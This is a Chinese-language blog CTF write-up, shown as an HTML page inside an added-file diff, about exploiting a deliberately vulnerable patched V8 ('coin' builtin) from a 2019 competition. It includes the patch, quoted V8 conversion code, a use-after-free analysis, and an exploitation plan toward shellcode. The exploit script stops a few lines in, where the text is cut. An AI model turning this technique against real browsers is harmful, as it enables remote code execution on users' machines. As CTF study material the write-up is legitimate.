@@ -1,0 +1,1379 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="2019-数字经济大赛决赛-Browser捡一下一年前入门的v8，这道题目是19年比赛线下的题目，调完oob之后就没再研究v8了，拿题目回顾一下基础的browser-pwn的解题思路。 漏洞分析看下patch文件，patch为Array类型增加了一个coin函数，该函数接受两个参数，分别为length和value，当array_length大于37时，设置arr[37]=value-&amp;gt;Num">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-数字经济大赛决赛-Browser">
+<meta property="og:url" content="http://ama2in9.top/2021/03/05/shuzijingji/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="2019-数字经济大赛决赛-Browser捡一下一年前入门的v8，这道题目是19年比赛线下的题目，调完oob之后就没再研究v8了，拿题目回顾一下基础的browser-pwn的解题思路。 漏洞分析看下patch文件，patch为Array类型增加了一个coin函数，该函数接受两个参数，分别为length和value，当array_length大于37时，设置arr[37]=value-&amp;gt;Num">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ama2in9.top/2021/03/05/shuzijingji/1.png">
+<meta property="og:image" content="http://ama2in9.top/2021/03/05/shuzijingji/2.png">
+<meta property="og:image" content="http://ama2in9.top/2021/03/05/shuzijingji/3.png">
+<meta property="og:updated_time" content="2021-03-05T05:20:47.652Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019-数字经济大赛决赛-Browser">
+<meta name="twitter:description" content="2019-数字经济大赛决赛-Browser捡一下一年前入门的v8，这道题目是19年比赛线下的题目，调完oob之后就没再研究v8了，拿题目回顾一下基础的browser-pwn的解题思路。 漏洞分析看下patch文件，patch为Array类型增加了一个coin函数，该函数接受两个参数，分别为length和value，当array_length大于37时，设置arr[37]=value-&amp;gt;Num">
+<meta name="twitter:image" content="http://ama2in9.top/2021/03/05/shuzijingji/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://ama2in9.top/2021/03/05/shuzijingji/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>2019-数字经济大赛决赛-Browser | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2021/03/05/shuzijingji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019-数字经济大赛决赛-Browser
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-03-05 13:16:34 / Modified: 13:20:47" itemprop="dateCreated datePublished" datetime="2021-03-05T13:16:34+08:00">2021-03-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/03/05/shuzijingji/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/03/05/shuzijingji/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/03/05/shuzijingji/" class="leancloud_visitors" data-flag-title="2019-数字经济大赛决赛-Browser">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="2019-数字经济大赛决赛-Browser"><a href="#2019-数字经济大赛决赛-Browser" class="headerlink" title="2019-数字经济大赛决赛-Browser"></a>2019-数字经济大赛决赛-Browser</h1><p>捡一下一年前入门的v8，这道题目是19年比赛线下的题目，调完oob之后就没再研究v8了，拿题目回顾一下基础的browser-pwn的解题思路。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>看下patch文件，patch为Array类型增加了一个coin函数，该函数接受两个参数，分别为length和value，当array_length大于37时，设置<code>arr[37]=value-&gt;Number()</code>，这里乍一看没什么问题，因为判断了数组的长度，但是注意这里的elements是之前取出的局部变量<code>FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</code>，这里的问题在于执行<code>ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</code>获取length的数值时，ToNumber会调用对象的回调函数。这一点我们可以跟进这个方法查看。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+// Vulnerability is here</span></span><br><span class="line"><span class="addition">+// You can't use this vulnerability in Debug Build :)</span></span><br><span class="line"><span class="addition">+BUILTIN(ArrayCoin) &#123;</span></span><br><span class="line"><span class="addition">+  uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+  if (len != 3) &#123;</span></span><br><span class="line"><span class="addition">+     return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; length;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span></span><br><span class="line"><span class="addition">+  if(37 &lt; array_length)&#123;</span></span><br><span class="line"><span class="addition">+    elements.set(37, value-&gt;Number());</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();  </span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  else&#123;</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   Handle&lt;Object&gt; receiver = args.receiver();</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 3412edb89d..1837771098 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line">@@ -367,6 +367,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayCoin)                                   \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index f5fa8f19fe..03a7b601aa 100644</span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line">@@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayCoin:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index e7542dcd6b..059b54731b 100644</span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line">@@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "copyWithin",</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line"><span class="addition">+	SimpleInstallFunction(isolate_, proto, "coin",</span></span><br><span class="line"><span class="addition">+				Builtins::kArrayCoin, 2, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "fill",</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "find",</span><br></pre></td></tr></table></figure>
+<p>可以看到，当输入为数字时直接返回该数字，否则，调用<code>ConvertToNumberOrNumeric</code>，在该函数进一步判断后如果仍无法确定则调用<code>ToPrimitive</code>函数，在该函数中使用<code>GetMethod</code>获得回调函数，最后<code>Execution::Call(isolate, exotic_to_prim, receiver, 1, &amp;hint_string),Object);</code>调用该函数。结合patch，可以看到elements被取出之后我们调用了ToNumber，假如我们在回调函数中修改arr的大小，就会调用GC重新分配数组的空间，而之前局部变量保存的elements指向了释放的空间，因此存在UAF。假使我们最开始给一个arr_length合适(&lt;37)的Array，则可以通过越界写Array后面的ArrayBuffer的size，从而得到一个oob数组，通过越界读可以得到double_arr的map和obj_arr的map，从而可以构造addressOf和fakeObj原语。</p>
+<p>再往后伪造ArraryBuffer借助Dataview实现任意地址读写，写wasm的shellcode最后替换成我们谈计算器或者get shell的shellcode。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">Object::ToNumber</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (input-&gt;IsNumber()) <span class="keyword">return</span> input;  <span class="comment">// Shortcut.</span></span><br><span class="line">  <span class="keyword">return</span> ConvertToNumberOrNumeric(isolate, input, Conversion::kToNumber);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">Object::ConvertToNumberOrNumeric</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                     Handle&lt;Object&gt; input,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                     Conversion mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsNumber()) &#123;</span><br><span class="line">      <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsString()) &#123;</span><br><span class="line">      <span class="keyword">return</span> String::ToNumber(isolate, Handle&lt;String&gt;::cast(input));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsOddball()) &#123;</span><br><span class="line">      <span class="keyword">return</span> Oddball::ToNumber(isolate, Handle&lt;Oddball&gt;::cast(input));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsSymbol()) &#123;</span><br><span class="line">      THROW_NEW_ERROR(isolate, NewTypeError(MessageTemplate::kSymbolToNumber),</span><br><span class="line">                      Object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsBigInt()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (mode == Conversion::kToNumeric) <span class="keyword">return</span> input;</span><br><span class="line">      DCHECK_EQ(mode, Conversion::kToNumber);</span><br><span class="line">      THROW_NEW_ERROR(isolate, NewTypeError(MessageTemplate::kBigIntToNumber),</span><br><span class="line">                      Object);</span><br><span class="line">    &#125;</span><br><span class="line">    ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">        isolate, input,</span><br><span class="line">        JSReceiver::ToPrimitive(Handle&lt;JSReceiver&gt;::cast(input),</span><br><span class="line">                                ToPrimitiveHint::kNumber),</span><br><span class="line">        Object);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">JSReceiver::ToPrimitive</span><span class="params">(Handle&lt;JSReceiver&gt; receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            ToPrimitiveHint hint)</span> </span>&#123;</span><br><span class="line">  Isolate* <span class="keyword">const</span> isolate = receiver-&gt;GetIsolate();</span><br><span class="line">  Handle&lt;Object&gt; exotic_to_prim;</span><br><span class="line">  ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">      isolate, exotic_to_prim,</span><br><span class="line">      Object::GetMethod(receiver, isolate-&gt;factory()-&gt;to_primitive_symbol()),</span><br><span class="line">      Object);</span><br><span class="line">  <span class="keyword">if</span> (!exotic_to_prim-&gt;IsUndefined(isolate)) &#123;</span><br><span class="line">    Handle&lt;Object&gt; hint_string =</span><br><span class="line">        isolate-&gt;factory()-&gt;ToPrimitiveHintString(hint);</span><br><span class="line">    Handle&lt;Object&gt; result;</span><br><span class="line">    ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">        isolate, result,</span><br><span class="line">        Execution::Call(isolate, exotic_to_prim, receiver, <span class="number">1</span>, &amp;hint_string),</span><br><span class="line">        Object);</span><br><span class="line">    <span class="keyword">if</span> (result-&gt;IsPrimitive()) <span class="keyword">return</span> result;</span><br><span class="line">    THROW_NEW_ERROR(isolate,</span><br><span class="line">                    NewTypeError(MessageTemplate::kCannotConvertToPrimitive),</span><br><span class="line">                    Object);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OrdinaryToPrimitive(receiver, (hint == ToPrimitiveHint::kString)</span><br><span class="line">                                           ? OrdinaryToPrimitiveHint::kString</span><br><span class="line">                                           : OrdinaryToPrimitiveHint::kNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为一年没调v8了，搭环境花了一天，在Ubuntu 18.04/20.04还是失败了，还是用回之前Ubuntu 16.04搭的环境.</p>
+<p>debug没有加patch，没有job调试比较麻烦，为了了解内存布局我是同一个exp两边对比调试，确定好偏移后我们最终构造另一个Length为30的Array，element对应的37的位置为下一个Arrary的length位</p>
+<p><img src="/2021/03/05/shuzijingji/1.png" alt></p>
+<p><img src="/2021/03/05/shuzijingji/2.png" alt></p>
+<p>因为16.04的gnome被我搞崩了所以没法弹计算器了:(，这里贴一下最后执行shellcode的图。</p>
+<p><img src="/2021/03/05/shuzijingji/3.png" alt></p>
+<p>exp如下，有一个很关键的问题是addressOf不能执行两次，第二次会crash，没有深入了解过v8因此不清楚原因，写一个新函数调用即可leak，很神奇。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a dataview</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> val = &#123;</span><br><span class="line">    valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        array.length = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64f</span>(<span class="params">high,low</span>)</span>&#123;</span><br><span class="line">    dv.setUint32(<span class="number">0</span>,high,<span class="literal">true</span>);</span><br><span class="line">    